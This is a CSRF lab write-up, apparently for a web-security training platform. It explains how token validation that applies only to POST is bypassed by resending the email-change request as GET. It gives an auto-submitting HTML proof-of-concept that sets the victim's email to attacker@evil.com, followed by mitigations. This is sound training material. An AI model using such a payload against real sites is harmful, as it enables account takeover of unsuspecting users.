# Lab02 - CSRF Where Token Validation Depends on Request Method

## Objective

Exploit a CSRF vulnerability by bypassing token validation through changing the request method.

---

# Lab Difficulty

```text
Practitioner
```

---

# Vulnerability Overview

The application attempts to protect against CSRF attacks using a CSRF token.

However, token validation only occurs for:

```http
POST
```

requests.

When the request is converted to:

```http
GET
```

the CSRF token is no longer validated.

---

# Root Cause

The application applies CSRF protection inconsistently.

```text
POST Request
        ↓
Token Validated

GET Request
        ↓
No Validation
```

---

# Analysis

Captured request:

```http
POST /my-account/change-email

csrf=TOKEN
email=user@example.com
```

Changing the CSRF token:

```text
Request Rejected
```

Converting request to GET:

```http
GET /my-account/change-email?email=attacker@evil.com
```

Request accepted.

---

# Attack Methodology

```text
Capture Request
        ↓
Verify Token Validation
        ↓
Convert POST To GET
        ↓
Generate CSRF PoC
        ↓
Deliver To Victim
```

---

# Exploitation Steps

### Step 1

Capture email change request.

---

### Step 2

Modify CSRF token.

Observe:

```text
Request Rejected
```

---

### Step 3

Convert request:

```http
POST → GET
```

---

### Step 4

Verify request succeeds without token.

---

### Step 5

Generate CSRF PoC.

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

### Step 6

Host exploit on exploit server.

---

### Step 7

Deliver exploit.

---

# Why The Attack Works

The application validates tokens only for POST requests.

GET requests completely bypass validation.

---

# Mitigation

Applications should:

- Validate tokens for all methods
- Avoid state-changing GET requests
- Use SameSite cookies
- Implement Origin validation

---

# Related Theory

- `08-common-flaws-in-csrf-token-validation.md`

---

# Key Learnings

- CSRF protection must be method-independent.
- GET requests should never perform sensitive actions.
- Token validation logic is as important as token existence.

> [!WARNING]
> State-changing functionality should never be accessible via GET requests.